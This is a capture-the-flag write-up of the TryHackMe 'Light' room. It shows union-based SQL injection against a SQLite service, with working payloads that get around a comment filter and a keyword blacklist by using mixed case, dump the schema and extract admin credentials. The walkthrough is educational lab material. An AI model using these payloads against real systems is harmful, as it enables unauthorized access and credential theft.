---
title: "TryHackMe: Light"
author: jaxafed
categories: [TryHackMe]
date: 2025-01-20 00:00:01 +0000
tags: [sql, sql injection, sqlite]
render_with_liquid: false
media_subpath: /images/tryhackme_light/
image:
  path: room_image.webp
---

**Light** was a simple room where we exploited an `SQL` injection in a `SQLite` database to retrieve the credentials for the admin user and a flag.

[![Tryhackme Room Link](room_card.webp){: width="300" height="300" .shadow}](https://tryhackme.com/r/room/lightroom){: .center }

## Discovering the SQL Injection

As per the room instructions, after connecting to the service on port `1337`, we encounter a database application.

```console
$ rlwrap nc 10.10.67.194 1337
Welcome to the Light database!
Please enter your username:
```

The room also instructs us to use the username `smokey` to begin, and upon entering it, we retrieve the password for the user.

```console
Please enter your username: smokey
Password: vYQ5ngPpw8AdUmL
```

Since it is a database application, if we try a simple `SQL` injection with `'`, we see that it is successful as we get the error: `Error: unrecognized token: "''' LIMIT 30"`.

```console
Please enter your username: '
Error: unrecognized token: "''' LIMIT 30"
```

Trying a union-based injection and commenting out the `' LIMIT 30` part with `--`, we encounter an interesting error stating that `/*`, `--`, or `%0b` are not allowed.

```console
Please enter your username: ' UNION SELECT 1-- -
For strange reasons I can't explain, any input containing /*, -- or, %0b is not allowed :)
```

Instead of trying to comment out the last part due to the `'` causing errors, since `SELECT 1 ''` is a valid query, we can turn the query into `UNION SELECT 1 '' LIMIT 30` by appending `'` to our payload as `' UNION SELECT 1 '`. As we can see, this works, but this time we encounter an interesting error about certain words not being allowed.

```console
Please enter your username: ' UNION SELECT 1 '
Ahh there is a word in there I don't like :(
```

It seems the `UNION` and `SELECT` keywords are not allowed, but we can easily bypass this filter by using capitalization.

```console
Please enter your username: UNION
Ahh there is a word in there I don't like :(
Please enter your username: SELECT
Ahh there is a word in there I don't like :(
Please enter your username: Union
Username not found.
Please enter your username: Select
Username not found.
```

As we can see now, with the payload `' Union Select 1 '`, we are successful with a union-based injection.

```console
Please enter your username: ' Union Select 1 '
Password: 1
```

## Identifying the DBMS

With the union-based injection we have, if we attempt to identify the database management system, we discover it is `SQLite`.

```console
Please enter your username: ' Union Select version() '
Error: no such function: version
Please enter your username: ' Union Select USER_ID(1) '
Error: no such function: USER_ID
Please enter your username: ' Union Select sqlite_version() '
Password: 3.31.1
```

## Dumping Database Structure

Now that we know the DBMS is `SQLite`, we can use the payload `' Union Select group_concat(sql) FROM sqlite_master '` to extract the database structure, as shown below:

```console
Please enter your username: ' Union Select group_concat(sql) FROM sqlite_master '
Password: CREATE TABLE usertable (
                   id INTEGER PRIMARY KEY,
                   username TEXT,
                   password INTEGER),CREATE TABLE admintable (
                   id INTEGER PRIMARY KEY,
                   username TEXT,
                   password INTEGER)
```

## Extracting Data

Since our goal is to find the credentials for the admin user, we can dump the `username` and `password` fields from the `admintable` using the payload `' Union Select group_concat(username || ":" || password) FROM admintable '` and this not only gives us the credentials but also the flag, allowing us to complete the room.

```console
Please enter your username: ' Union Select group_concat(username || ":" || password) FROM admintable '
Password: Tr[REDACTED]in:ma[REDACTED]17,flag:THM{SQ[REDACTED]O?}
```
{: .wrap }

<style>
.center img {        
  display:block;
  margin-left:auto;
  margin-right:auto;
}
.wrap pre{
    white-space: pre-wrap;
}
</style>


